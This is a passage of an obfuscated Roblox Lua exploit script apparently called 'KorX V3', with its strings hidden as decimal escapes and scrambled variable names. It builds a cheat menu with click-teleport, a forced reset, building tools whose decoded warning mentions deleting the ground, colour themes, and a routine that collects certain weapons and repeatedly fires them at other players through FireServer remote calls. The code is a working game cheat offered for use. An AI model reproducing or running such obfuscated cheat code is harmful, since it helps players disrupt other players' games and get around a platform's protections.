game.Players.LocalPlayer.Character["\49"]:Destroy()
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.Animate.Disabled = true
wait(0.1)
game.Players.LocalPlayer.Character.Animate.Disabled = false
game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "\78\111\110\101"
end)
farcgp.Name = "\84\69\76\69\80\79\82\84\75\69\89"
farcgp.Parent = m_oikl
farcgp.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
farcgp.BackgroundTransparency = 0.30000001192093
farcgp.Position = UDim2.new(0.047786735, 0, 0.606361866, 0)
farcgp.Size = UDim2.new(0, 160, 0, 40)
farcgp.Font = Enum.Font.Garamond
farcgp.Text = "\84\69\76\69\80\79\82\84\32\75\69\89\32\40\118\41"
farcgp.TextColor3 = Color3.new(0, 0, 0)
farcgp.TextSize = 14
farcgp.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\84\101\108\101\112\111\114\116\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\59\32\112\114\101\115\115\32\39\118\39\32\116\111\32\116\101\108\101\112\111\114\116\46\32\89\111\117\32\99\97\110\110\111\116\32\116\101\108\101\112\111\114\116\32\116\111\111\32\102\97\114\46";
})
_oiklqdtenbj = game.Players.LocalPlayer 
m_oiklqdten = _oiklqdtenbj.Character.HumanoidRootPart
klqdtenbjs = _oiklqdtenbj:GetMouse() 
klqdtenbjs.KeyDown:connect(function(m_oiklqdtenb_) 
if m_oiklqdtenb_ == "\118" then 
if klqdtenbjs.Target then 
m_oiklqdten.CFrame = CFrame.new(klqdtenbjs.Hit.x, klqdtenbjs.Hit.y + 5, klqdtenbjs.Hit.z) 
end 
end 
end)
end)
sfarc.Name = "\82\69\83\69\84\75\69\89"
sfarc.Parent = m_oikl
sfarc.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
sfarc.BackgroundTransparency = 0.30000001192093
sfarc.Position = UDim2.new(0.047786735, 0, 0.703777432, 0)
sfarc.Size = UDim2.new(0, 160, 0, 40)
sfarc.Font = Enum.Font.Garamond
sfarc.Text = "\82\69\83\69\84\32\75\69\89\32\40\112\41"
sfarc.TextColor3 = Color3.new(0, 0, 0)
sfarc.TextSize = 14
sfarc.MouseButton1Down:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\80\114\101\115\115\32\39\112\39\32\116\111\32\114\101\115\101\116\32\99\104\97\114\97\99\116\101\114\46";
})
local lqdtenbjs = game.Players.LocalPlayer
local klqdtenbjs = lqdtenbjs:GetMouse()
klqdtenbjs.KeyDown:connect(function(m_oiklqdtenb_)
    if m_oiklqdtenb_ == "\112" then
  game.Players.LocalPlayer.Character:BreakJoints()
    end
end) 
end)
jsfarc.Name = "\70\117\110\47\66\121\112\97\115\115\32\116\105\116\108\101"
jsfarc.Parent = m_oikl
jsfarc.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
jsfarc.BackgroundTransparency = 0.5
jsfarc.Position = UDim2.new(0.047786735, 0, 0.0305817239, 0)
jsfarc.Size = UDim2.new(0, 160, 0, 34)
bjsfar.Parent = jsfarc
bjsfar.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
bjsfar.BackgroundTransparency = 0.5
bjsfar.Position = UDim2.new(0, 0, -1.86264515e-09, 0)
bjsfar.Size = UDim2.new(0, 160, 0, 34)
bjsfar.Font = Enum.Font.Garamond
bjsfar.Text = "\91\70\117\110\32\47\32\66\121\112\97\115\115\93"
bjsfar.TextColor3 = Color3.new(0, 0, 0)
bjsfar.TextScaled = true
bjsfar.TextSize = 14
bjsfar.TextWrapped = true
nbjsf.Name = "\66\84\79\79\76\83"
nbjsf.Parent = m_oikl
nbjsf.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
nbjsf.BackgroundTransparency = 0.30000001192093
nbjsf.Position = UDim2.new(0.0477867313, 0, 0.802739739, 0)
nbjsf.Size = UDim2.new(0, 160, 0, 40)
nbjsf.Font = Enum.Font.Garamond
nbjsf.Text = "\66\84\79\79\76\83"
nbjsf.TextColor3 = Color3.new(1, 0, 0)
nbjsf.TextSize = 14
nbjsf.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\66\84\111\111\108\115\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46\32\67\97\114\101\102\117\108\32\110\111\116\32\116\111\32\100\101\108\101\116\101\32\116\104\101\32\103\114\111\117\110\100\32\98\121\32\97\99\99\105\100\101\110\116\46";
})
local enbjsfarcg = game.Players.LocalPlayer
local tenbjs = Instance.new("\72\111\112\112\101\114\66\105\110",enbjsfarcg.Backpack)
tenbjs.BinType = "\67\108\111\110\101"
local dtenbjsfar = Instance.new("\72\111\112\112\101\114\66\105\110",enbjsfarcg.Backpack)
dtenbjsfar.BinType = "\72\97\109\109\101\114"
local qdtenbjs = Instance.new("\72\111\112\112\101\114\66\105\110",enbjsfarcg.Backpack)
qdtenbjs.BinType = "\71\114\97\98"
end)
enbjsfarcg = game.Players.LocalPlayer
enbjsf.Name = "\78\47\65"
enbjsf.Parent = m_oikl
enbjsf.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
enbjsf.BackgroundTransparency = 0.30000001192093
enbjsf.Position = UDim2.new(0.047786735, 0, 0.900596499, 0)
enbjsf.Size = UDim2.new(0, 160, 0, 40)
enbjsf.Font = Enum.Font.Garamond
enbjsf.Text = "\82\69\83\80\65\87\78"
enbjsf.TextColor3 = Color3.new(0, 0, 0)
enbjsf.TextSize = 14
enbjsf.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
enbjsfarcg.Character.Humanoid.Health = 0
wait(1)
enbjsfarcg.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
enbjsfarcg.Character.Torso.CFrame = CFrame.new(1000000,0,1000000)
end)
sf_3.Name = "\77\70\84\105\116\108\101\66\111\120"
sf_3.Parent = arc
sf_3.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
sf_3.BackgroundTransparency = 0.5
sf_3.Position = UDim2.new(0.425661922, 0, 0.181818187, 0)
sf_3.Size = UDim2.new(0, 145, 0, 58)
dtenb.Name = "\77\70\84\105\116\108\101\66\111\120"
dtenb.Parent = arc
dtenb.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
dtenb.BackgroundTransparency = 0.5
dtenb.Position = UDim2.new(0.441955179, 0, 0.194545433, 0)
dtenb.Size = UDim2.new(0, 112, 0, 43)
qdtenb_8.Parent = dtenb
qdtenb_8.BackgroundColor3 = Color3.new(1, 1, 1)
qdtenb_8.BackgroundTransparency = 1
qdtenb_8.Position = UDim2.new(0.0352646112, 0, -0.0152282864, 0)
qdtenb_8.Size = UDim2.new(0, 105, 0, 43)
qdtenb_8.Font = Enum.Font.Fantasy
qdtenb_8.Text = "\77\97\100\101\32\98\121\32\75\111\114\95\101\35\54\52\55\53"
qdtenb_8.TextColor3 = Color3.new(0, 0, 0)
qdtenb_8.TextScaled = true
qdtenb_8.TextSize = 14
qdtenb_8.TextWrapped = true
lqdte.Name = "\76\111\103\73\110\70\114\97\109\101"
lqdte.Parent = cgp
lqdte.BackgroundColor3 = Color3.new(0, 0, 0)
lqdte.BorderColor3 = Color3.new (255, 0 ,0)
lqdte.BorderSizePixel = 5
lqdte.BackgroundTransparency = 0.5
lqdte.Position = UDim2.new(0.398617506, 0, 0.201892734, 0)
lqdte.Size = UDim2.new(0, 264, 0, 377)
klqdt.Name = "\70\97\100\101"
klqdt.Parent = lqdte
klqdt.BackgroundColor3 = Color3.new(1, 0, 0)
klqdt.BackgroundTransparency = 0.5
klqdt.BorderColor3 = Color3.new(1, 0, 0.0156863)
klqdt.Position = UDim2.new(0.0606060624, 0, 0.0583554357, 0)
klqdt.Size = UDim2.new(0, 232, 0, 68)
iklqd.Name = "\75\111\114\88\32\76\105\111\110\32\105\109\97\103\101"
iklqd.Parent = klqdt
iklqd.BackgroundColor3 = Color3.new(0.862745, 0.992157, 1)
iklqd.BackgroundTransparency = 1
iklqd.Position = UDim2.new(-0.068965517, 0, 1.39705884, 0)
iklqd.Size = UDim2.new(0, 264, 0, 259)
iklqd.Image = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\53\51\48\52\51\56\57\49\56"
iklqd.ImageColor3 = Color3.new(1, 0, 0.0470588)
iklqd.ImageTransparency = 0.30000001192093
oiklqd.Name = "\70\97\100\101\51"
oiklqd.Parent = lqdte
oiklqd.BackgroundColor3 = Color3.new(1, 0, 0)
oiklqd.BackgroundTransparency = 0.5
oiklqd.BorderColor3 = Color3.new(1, 0, 0.0156863)
oiklqd.Position = UDim2.new(0.0597856045, 0, 0.0742914975, 0)
oiklqd.Size = UDim2.new(0, 232, 0, 68)
_oiklq.Name = "\70\97\100\101\52"
_oiklq.Parent = lqdte
_oiklq.BackgroundColor3 = Color3.new(1, 0, 0)
_oiklq.BackgroundTransparency = 0.5
_oiklq.BorderColor3 = Color3.new(1, 0, 0.0156863)
_oiklq.Position = UDim2.new(0.0597856045, 0, 0.0902066156, 0)
_oiklq.Size = UDim2.new(0, 232, 0, 68)
m_oiklq.Name = "\91\75\111\114\88\32\86\51\93\32\76\111\103\105\110\32\84\105\116\108\101"
m_oiklq.Parent = _oiklq
m_oiklq.BackgroundColor3 = Color3.new(1, 1, 1)
m_oiklq.BackgroundTransparency = 1
m_oiklq.Position = UDim2.new(0.068965517, 0, -0.0588235296, 0)
m_oiklq.Size = UDim2.new(0, 200, 0, 50)
m_oiklq.Font = Enum.Font.Garamond
m_oiklq.Text = "\91\75\111\114\88\32\86\51\93"
m_oiklq.TextColor3 = Color3.new(0, 0, 0)
m_oiklq.TextScaled = true
m_oiklq.TextSize = 14
m_oiklq.TextWrapped = true
pm_oikl.Name = "\70\97\100\101\50"
pm_oikl.Parent = lqdte
pm_oikl.BackgroundColor3 = Color3.new(1, 0, 0)
pm_oikl.BackgroundTransparency = 0.5
pm_oikl.BorderColor3 = Color3.new(1, 0, 0.0156863)
pm_oikl.Position = UDim2.new(0.0597856045, 0, 0.0398087353, 0)
pm_oikl.Size = UDim2.new(0, 232, 0, 68)
gpm_oik.Parent = lqdte
gpm_oik.BackgroundColor3 = Color3.new(1, 1, 1)
gpm_oik.BackgroundTransparency = 0.5
gpm_oik.Position = UDim2.new(0.139331013, 0, 0.310344815, 0)
gpm_oik.Size = UDim2.new(0, 189, 0, 53)
pm.Name = "\84\104\101\109\101\70\114\97\109\101"
pm.Parent = cgp
pm.BackgroundColor3 = Color3.new(0, 0, 0)
pm.BackgroundTransparency = 0.5
pm.BorderColor3 = Color3.new(1, 0, 0)
pm.Visible = false
pm.BorderSizePixel = 9
pm.Position = UDim2.new(0.10, 0, 0.311077386, 0)
pm.Size = UDim2.new(0, 124, 0, 276)
gp.Name = "\116\104\101\109\101\102\114\97\109\101\50"
gp.Parent = pm
gp.BackgroundColor3 = Color3.new(1, 1, 1)
gp.BackgroundTransparency = 0.60000002384186
gp.Position = UDim2.new(0.0967741907, 0, 0.192565247, 0)
gp.Size = UDim2.new(0, 100, 0, 215)
cg.Name = "\82\69\68"
cg.Parent = gp
cg.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
cg.BackgroundTransparency = 0.30000001192093
cg.Position = UDim2.new(0.100000001, 0, 0.0307692345, 0)
cg.Size = UDim2.new(0, 80, 0, 32)
cg.Font = Enum.Font.Garamond
cg.Text = "\82\69\68"
cg.TextColor3 = Color3.new(0, 0, 0)
cg.TextSize = 17
cg.TextWrapped = true
cg.MouseButton1Click:connect(function()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\89\111\117\32\104\97\118\101\32\115\101\108\101\99\116\101\100\32\116\104\101\32\82\101\100\32\116\104\101\109\101";
})
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
sf.BackgroundColor3 = Color3.new(255,0,0)
sf_2.BackgroundColor3 = Color3.new(255,0,0)
sf_3.BackgroundColor3 = Color3.new(255,0,0)
dtenb.BackgroundColor3 = Color3.new(255,0,0)
jsfa.BackgroundColor3 = Color3.new(255,0,0)
jsfa_2.BackgroundColor3 = Color3.new(255,0,0)
jsfarc.BackgroundColor3 = Color3.new(255,0,0)
qdtenb.BackgroundColor3 = Color3.new(255,0,0)
bjsfa.BackgroundColor3 = Color3.new(255,0,0)
gpm_.BackgroundColor3 = Color3.new(255,0,0)
kl.BackgroundColor3 = Color3.new(255,0,0)
cgpm.BackgroundColor3 = Color3.new(255,0,0)
qdtenb_4.BackgroundColor3 = Color3.new(255,0,0)
oikl.BackgroundColor3 = Color3.new(255,0,0)
nbjs.BackgroundColor3 = Color3.new(255,0,0)
bjsfar.BackgroundColor3 = Color3.new(255,0,0)
qdtenb_8.BackgroundColor3 = Color3.new(255,0,0)
m_oiklqdtenb_o.BackgroundColor3 = Color3.new(255,0,0)
qdtenb_11.BackgroundColor3 = Color3.new(255,0,0)
arc.BorderColor3 = Color3.new(255,0,0)
iklqd.ImageColor3 = Color3.new(255,0,0)
far.ImageColor3 = Color3.new(255,0,0)
far.BackgroundColor3 = Color3.new(2255,0,0)
far.BorderColor3 = Color3.new(255,0,0)
lq.BackgroundColor3 =Color3.new(255,0,0)
ikl.BackgroundColor3 = Color3.new(255,0,0)
pm.BorderColor3 = Color3.new(255,0,0)
pm_.BorderColor3 = Color3.new(255,0,0)
n.BorderColor3 = Color3.new(255,0,0)
end)
pm_o.MouseButton2Click:connect(function()
local lqdtenbjs = game.Players.LocalPlayer
local klqdtenbjs = lqdtenbjs:GetMouse()
klqdtenbjs.KeyDown:connect(function(m_oiklqdtenb_)
    if m_oiklqdtenb_ == "\107" then
for _,klqdte in pairs(game.Players.LocalPlayer:GetChildren()) do
if (klqdte:IsA("\84\111\111\108")) then
klqdte.Parent = game.Players.LocalPlayer.Backpack
end
end
end
end)
end)
_oi.MouseButton2Click:connect(function()
local _oiklqdtenbj = game.Players.LocalPlayer
local m_oiklqdtenb = _oiklqdtenbj:GetMouse()
local pm_oiklqdt = game:GetService("\82\117\110\83\101\114\118\105\99\101").Heartbeat
local dtenbjsfarc = _oiklqdtenbj.Character.Humanoid
local cgpm_oiklq = ""
local rcg = {}
local arcgpm_oik = false
local farcgpm_oik = false
function g()
local sfarcgpm = Instance.new("\83\111\117\110\100", _oiklqdtenbj.PlayerGui)
sfarcgpm.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\52\51\57\50\54\48\50\57\50"
sfarcgpm.Volume = 2
sfarcgpm.PlayOnRemove = true
wait()
sfarcgpm:Destroy()
end
function c()
farcgpm_oik = true
local jsfarcg = _oiklqdtenbj.Backpack:GetChildren()
for c,f in ipairs(jsfarcg) do
if f.Name == "\85\122\105" or f.Name == "\83\104\111\115\100\116\116\121" or f.Name == "\71\108\111\115\100\99\107" or f.Name == "\83\97\119\115\100\101\100\32\79\102\102" then
table.insert(rcg, f)
end
end
end
function r()
farcgpm_oik = false
rcg = {}
end
function gpm_oiklq()
local bjsfarcgp = function(o)
local nbjsfarcgp = Instance.new("\66\105\108\108\98\111\97\114\100\71\117\105", o)
nbjsfarcgp.Adornee = o
nbjsfarcgp.Size = UDim2.new(3,0,2,0)
nbjsfarcgp.StudsOffset = Vector3.new(0,2,0)
nbjsfarcgp.AlwaysOnTop = true
nbjsfarcgp = Instance.new("\73\109\97\103\101\76\97\98\101\108")
nbjsfarcgp.Image = "\104\116\116\112\58\47\47\119\119\119\46\114\111\98\108\111\120\46\99\111\109\47\97\115\115\101\116\47\63\105\100\61\49\52\50\52\48\54\51\52\53" 
nbjsfarcgp.Size = UDim2.new(1.25,0,1.75,0)
nbjsfarcgp.Position = UDim2.new(-0.125,0,-1.1,0)
nbjsfarcgp.BackgroundTransparency = 1
end 
local enbjsfarcgp = game.Players:GetChildren()
for gpm_oiklq,b in ipairs(enbjsfarcgp) do
local dtenbjsfarc = b.Character:FindFirstChild("\72\101\97\100")
if dtenbjsfarc then
bjsfarcgp(dtenbjsfarc)
end
end
end
m_oiklqdtenb.KeyDown:connect(function(_)
_=K:lower()
if _ == "\113" then
if farcgpm_oik == false then
c()
elseif farcgpm_oik == true then
r()
if dtenbjsfarc then
dtenbjsfarc:UnequipTools()
end 
end
end
if _ == "\39" then
for gpm_oiklq,b in ipairs(rcg) do
b.GripPos = Vector3.new(math.random(-2,2),0,math.random(-2,2))
end
end
end)
m_oiklqdtenb.Button1Down:connect(function()
if farcgpm_oik == true then
for gpm_oiklq,b in ipairs(rcg) do
b.Fire:FireServer(m_oiklqdtenb.Hit)
end
end
end)
pm_oiklqdt:connect(function()
if arcgpm_oik == true then
for gpm_oiklq,b in ipairs(rcg) do
if b and m_oiklqdtenb.Target then
local dtenbjsfarc = m_oiklqdtenb.Target.Parent:FindFirstChild("\72\117\109\97\110\111\105\100")
if dtenbjsfarc then
local qdtenbjsf = game.Players:FindFirstChild(dtenbjsfarc.Parent.Name)
if qdtenbjsf then
b.Fire:FireServer(m_oiklqdtenb.Hit)
end
end  
end
end
end
end)
_oiklqdtenbj.Character.Humanoid.Died:connect(function()
r()
end)
while true do
pm_oiklqdt:wait()
if farcgpm_oik == true then
for gpm_oiklq,b in ipairs(rcg) do
b.Parent = _oiklqdtenbj.Character
end
end
end
end)
m_oi.MouseButton2Click:connect(function()
local lqdtenbjs = game.Players.LocalPlayer
local klqdtenbjs = lqdtenbjs:GetMouse()
klqdtenbjs.KeyDown:connect(function(m_oiklqdtenb_)
    if m_oiklqdtenb_ == "\106" then
for _,klqdte in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if (klqdte:IsA("\84\111\111\108")) then
klqdte.Parent = game.Players.LocalPlayer
end
end
end
end)
end)
rc.Name = "\66\76\85\69"
rc.Parent = gp
rc.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
rc.BackgroundTransparency = 0.30000001192093
rc.Position = UDim2.new(0.100000001, 0, 0.230983019, 0)
rc.Size = UDim2.new(0, 80, 0, 32)
rc.Font = Enum.Font.Garamond
rc.Text = "\66\76\85\69"
rc.TextColor3 = Color3.new(0, 0, 0)
rc.TextSize = 17
rc.TextWrapped = true
rc.MouseButton1Click:connect(function()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\89\111\117\32\104\97\118\101\32\115\101\108\101\99\116\101\100\32\116\104\101\32\66\108\117\101\32\116\104\101\109\101";
})
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
sf.BackgroundColor3 = Color3.new(0, 34, 255)
sf_2.BackgroundColor3 = Color3.new(0, 34, 255)
sf_3.BackgroundColor3 = Color3.new(0, 34, 255)
dtenb.BackgroundColor3 = Color3.new(0, 34, 255)
jsfa.BackgroundColor3 = Color3.new(0, 34, 255)
jsfa_2.BackgroundColor3 = Color3.new(0, 34, 255)
jsfarc.BackgroundColor3 = Color3.new(0, 34, 255)
qdtenb.BackgroundColor3 = Color3.new(0, 34, 255)
bjsfa.BackgroundColor3 = Color3.new(0, 34, 255)
gpm_.BackgroundColor3 = Color3.new(0, 34, 255)
kl.BackgroundColor3 = Color3.new(0, 34, 255)
cgpm.BackgroundColor3 = Color3.new(0, 34, 255)
qdtenb_4.BackgroundColor3 = Color3.new(0, 34, 255)
oikl.BackgroundColor3 = Color3.new(0, 34, 255)
nbjs.BackgroundColor3 = Color3.new(0, 34, 255)
bjsfar.BackgroundColor3 = Color3.new(0, 34, 255)
qdtenb_8.BackgroundColor3 = Color3.new(0, 34, 255)
m_oiklqdtenb_o.BackgroundColor3 = Color3.new(0, 34, 255)
qdtenb_11.BackgroundColor3 = Color3.new(0, 34, 255)
arc.BorderColor3 = Color3.new(0, 34, 255)
iklqd.ImageColor3 = Color3.new(0, 34, 255)
far.ImageColor3 = Color3.new(0, 34, 255)
lq.BackgroundColor3 =Color3.new(0, 34, 255)
ikl.BackgroundColor3 = Color3.new(0, 34, 255)
pm.BorderColor3 = Color3.new(0, 34, 255)
pm_.BorderColor3 = Color3.new(0, 34, 255)
n.BorderColor3 = Color3.new(0, 34, 255)
end)
ar.Name = "\87\72\73\84\69"
ar.Parent = gp
ar.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
ar.BackgroundTransparency = 0.30000001192093
ar.Position = UDim2.new(0.100000001, 0, 0.422980219, 0)
ar.Size = UDim2.new(0, 80, 0, 32)
ar.Font = Enum.Font.Garamond
ar.Text = "\87\72\73\84\69"
ar.TextColor3 = Color3.new(0, 0, 0)
ar.TextSize = 17
ar.TextWrapped = true
ar.MouseButton1Click:connect(function()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\89\111\117\32\104\97\118\101\32\115\101\108\101\99\116\101\100\32\116\104\101\32\87\104\105\116\101\32\116\104\101\109\101";
})
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
sf.BackgroundColor3 = Color3.new(255,255,255)
sf_2.BackgroundColor3 = Color3.new(255,255,255)
sf_3.BackgroundColor3 = Color3.new(255,255,255)
dtenb.BackgroundColor3 = Color3.new(255,255,255)
jsfa.BackgroundColor3 = Color3.new(255,255,255)
jsfa_2.BackgroundColor3 = Color3.new(255,255,255)
jsfarc.BackgroundColor3 = Color3.new(255,255,255)
qdtenb.BackgroundColor3 = Color3.new(255,255,255)
bjsfa.BackgroundColor3 = Color3.new(255,255,255)
gpm_.BackgroundColor3 = Color3.new(255,255,255)
kl.BackgroundColor3 = Color3.new(255,255,255)
cgpm.BackgroundColor3 = Color3.new(255,255,255)
qdtenb_4.BackgroundColor3 = Color3.new(255,255,255)
oikl.BackgroundColor3 = Color3.new(255,255,255)
nbjs.BackgroundColor3 = Color3.new(255,255,255)
bjsfar.BackgroundColor3 = Color3.new(255,255,255)
qdtenb_8.BackgroundColor3 = Color3.new(255,255,255)
m_oiklqdtenb_o.BackgroundColor3 = Color3.new(255,255,255)
qdtenb_11.BackgroundColor3 = Color3.new(255,255,255)
arc.BorderColor3 = Color3.new(255,255,255)
iklqd.ImageColor3 = Color3.new(255,255,255)
far.ImageColor3 = Color3.new(255,255,255)
far.BackgroundColor3 = Color3.new(255, 255,255)
far.BorderColor3 = Color3.new(255,255,255)
lq.BackgroundColor3 =Color3.new(255,255,255)
ikl.BackgroundColor3 = Color3.new(255,255,255)
pm.BorderColor3 = Color3.new(255,255,255)
js.BackgroundColor3 = Color3.new(255,255,255)
pm_.BorderColor3 = Color3.new(255,255,255)
n.BorderColor3 = Color3.new(0, 34, 255)
end)
fa.Name = "\71\82\69\69\78"
fa.Parent = gp
fa.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
fa.BackgroundTransparency = 0.30000001192093
fa.Position = UDim2.new(0.100000001, 0, 0.61423701, 0)
fa.Size = UDim2.new(0, 80, 0, 32)
fa.Font = Enum.Font.Garamond
fa.Text = "\71\82\69\69\78"
fa.TextColor3 = Color3.new(0, 0, 0)
fa.TextSize = 17
fa.TextWrapped = true
fa.MouseButton1Click:connect(function()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\89\111\117\32\104\97\118\101\32\115\101\108\101\99\116\101\100\32\116\104\101\32\71\114\101\101\110\32\116\104\101\109\101";
})
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
sf.BackgroundColor3 = Color3.new(0, 85, 0)
sf_2.BackgroundColor3 = Color3.new(0, 85, 0)
sf_3.BackgroundColor3 = Color3.new(0, 85, 0)
dtenb.BackgroundColor3 = Color3.new(0, 85, 0)
jsfa.BackgroundColor3 = Color3.new(0, 85, 0)
jsfa_2.BackgroundColor3 = Color3.new(0, 85, 0)
jsfarc.BackgroundColor3 = Color3.new(0, 85, 0)
qdtenb.BackgroundColor3 = Color3.new(0, 85, 0)
bjsfa.BackgroundColor3 = Color3.new(0, 85, 0)
gpm_.BackgroundColor3 = Color3.new(0, 85, 0)
kl.BackgroundColor3 = Color3.new(0, 85, 0)
cgpm.BackgroundColor3 = Color3.new(0, 85, 0)
qdtenb_4.BackgroundColor3 = Color3.new(0, 85, 0)
oikl.BackgroundColor3 = Color3.new(0, 85, 0)
nbjs.BackgroundColor3 = Color3.new(0, 85, 0)
bjsfar.BackgroundColor3 = Color3.new(0, 85, 0)
qdtenb_8.BackgroundColor3 = Color3.new(0, 85, 0)
m_oiklqdtenb_o.BackgroundColor3 = Color3.new(0, 85, 0)
qdtenb_11.BackgroundColor3 = Color3.new(0, 85, 0)
arc.BorderColor3 = Color3.new(0, 85, 0)
iklqd.ImageColor3 = Color3.new(0, 85, 0)
far.ImageColor3 = Color3.new(0, 85, 0)
far.BackgroundColor3 = Color3.new(20, 85, 0)
far.BorderColor3 = Color3.new(0, 85, 0)
lq.BackgroundColor3 =Color3.new(0, 85, 0)
ikl.BackgroundColor3 = Color3.new(0, 85, 0)
pm.BorderColor3 = Color3.new(0, 85, 0)
pm_.BorderColor3 = Color3.new(0, 85, 0)
n.BorderColor3 = Color3.new(0, 85, 0)
end)
s.Name = "\80\73\78\75"
s.Parent = gp
s.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
s.BackgroundTransparency = 0.30000001192093
s.Position = UDim2.new(0.100000001, 0, 0.809358358, 0)
s.Size = UDim2.new(0, 80, 0, 32)
s.Font = Enum.Font.Garamond
s.Text = "\80\73\78\75"
s.TextColor3 = Color3.new(0, 0, 0)
s.TextSize = 17
